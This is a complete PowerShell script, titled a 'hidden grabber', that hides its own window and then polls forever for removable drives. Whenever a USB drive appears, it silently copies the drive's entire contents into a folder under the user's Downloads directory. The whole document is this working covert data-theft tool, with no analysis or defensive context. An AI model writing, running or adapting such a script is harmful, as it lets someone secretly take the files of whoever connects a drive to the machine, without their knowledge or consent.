# Hidden grabber USB data

$Signature = @"
[DllImport("user32.dll")]public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@
$ShowWindowAsync = Add-Type -MemberDefinition $Signature -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$ShowWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0)

$path = "$Env:USERPROFILE\Downloads\USB"

mkdir "$path"
Set-Location "$path"
while ($true){
    if ((get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter -ne $null) {
        $Driveletters = (get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter
        $i=0
        foreach ($drive in $Driveletters) {
            $DrivePath = (get-psdrive | where-object {$_.Name -eq $DriveLetters[$i]}).Root
            $Label = (get-volume | where-object {$_.DriveLetter -eq $DriveLetters[$i]}).FileSystemLabel
            mkdir $Label
            Robocopy.exe $DrivePath $Label /E  
            $i++
        }$i=0
        Start-Sleep -Seconds 10
    }
    else {
        Start-Sleep -Seconds 5
    }
}
